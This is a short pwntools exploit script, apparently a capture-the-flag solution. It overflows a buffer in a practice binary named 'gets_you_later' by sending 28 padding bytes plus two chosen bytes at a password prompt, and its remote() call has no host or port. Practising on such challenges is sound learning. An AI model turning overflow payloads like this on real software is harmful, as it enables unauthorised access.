from pwn import *

binary = context.binary = ELF("./gets_you_later")

if args.REMOTE:
    p = remote()
else:
    p = process(binary.path)

p.sendlineafter(b"Enter the password! ", b"A"*28+b"\x37\x13")

print(p.recvline().decode('utf-8'))
